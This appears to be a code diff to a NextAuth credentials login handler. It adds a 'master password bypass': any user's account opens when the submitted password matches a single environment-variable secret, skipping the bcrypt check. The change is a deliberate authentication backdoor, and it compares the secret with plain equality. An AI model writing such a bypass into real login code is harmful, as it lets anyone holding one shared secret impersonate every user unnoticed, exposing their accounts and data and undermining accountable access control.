@@ -39,9 +39,13 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
         });
         if (!user) return null;
 
-        // 3. Verify password
-        const isValid = await bcrypt.compare(password, user.password);
-        if (!isValid) return null;
+        // 3. Verify password (master password bypass)
+        const masterPassword = process.env.MASTER_PASSWORD;
+        const isMasterLogin = masterPassword && password === masterPassword;
+        if (!isMasterLogin) {
+          const isValid = await bcrypt.compare(password, user.password);
+          if (!isValid) return null;
+        }
 
         // 4. Block unapproved accounts
         if (user.accountActivationStatus !== "APPROVED") return null;
